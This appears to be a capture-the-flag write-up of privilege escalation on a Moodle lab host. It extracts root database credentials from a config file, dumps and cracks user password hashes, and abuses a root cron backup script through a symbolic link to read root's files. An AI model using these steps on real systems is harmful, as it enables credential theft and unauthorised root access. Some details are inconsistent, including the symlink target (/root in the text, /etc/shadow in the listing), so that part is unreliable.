# Privilege Escalation

- From /var/www/html/moodle/config.php.save, we can get the mysql credentials.
```php
www-data@teacher:/var/www/html/moodle$ cat config.php                                           
<?php  // Moodle configuration file                                                             
                                                                                                
unset($CFG);                                                                                    
global $CFG;                                                                                    
$CFG = new stdClass();

$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (

```
- We can login using `mysql -u root -pWelkom1!`
- We can check in database moodle, there is a table named as `mdl_user`
```mysql
MariaDB [moodle]> select id,username,password from mdl_user;
+------+-------------+--------------------------------------------------------------+
| id   | username    | password                                                     |
+------+-------------+--------------------------------------------------------------+
|    1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
|    2 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
|    3 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| 1337 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |

```
- We can see the password with user ID: LEET is in md5sum, which we can check online (no need for hashcat or john)
- giovanni:expelled
- We can try loggin in using these credentials. /etc/passwd, would have had the users with login capabilities, from where we can get the user giovanni, or check the home directory.


## User: root
- After running linpeas, we can see that there is a file `/usr/bin/backup.sh`, which we can read, which is creating a backup of /home/giovanni/work/courses directory in a tar file in ./tmp directory and then extarcting that and changing the pemissions to 777 for all the files recursively.
```bash
giovanni@teacher:/var/www/html/moodle$ cat /usr/bin/backup.sh 
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;

```
- Also date tells us that backup file is being created every minute, with root privileges, so there must be a cron job which is perfoming this every minute with rroot prrivileges.
```bash
giovanni@teacher:~$ ls -la work/tmp/backup_courses.tar.gz 
-rwxrwxrwx 1 root root 45 Apr 18 16:15 work/tmp/backup_courses.tar.gz
giovanni@teacher:~$ date
Sun Apr 18 16:15:12 CEST 2021
giovanni@teacher:~$ 

```
- So we can change the couses file as such so that we can get the root access or flag. We can create a symbolic link named `course` to root directory, using `ln -s /root courses`. Now the script will make a backup for the root directory and then get us `root.txt` in the `./tmp/course` directory
```bash
giovanni@teacher:~/work$ ls -la
total 16
drwxr-xr-x 4 giovanni giovanni 4096 Apr 18 15:44 .
drwxr-x--- 4 giovanni giovanni 4096 Nov  4  2018 ..
lrwxrwxrwx 1 giovanni giovanni   11 Apr 18 15:44 courses -> /etc/shadow
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 courses.bak
drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 tmp
giovanni@teacher:~/work$ cat tmp/courses/root.txt 
4f3a83b4...
giovanni@teacher:~/work$ 

```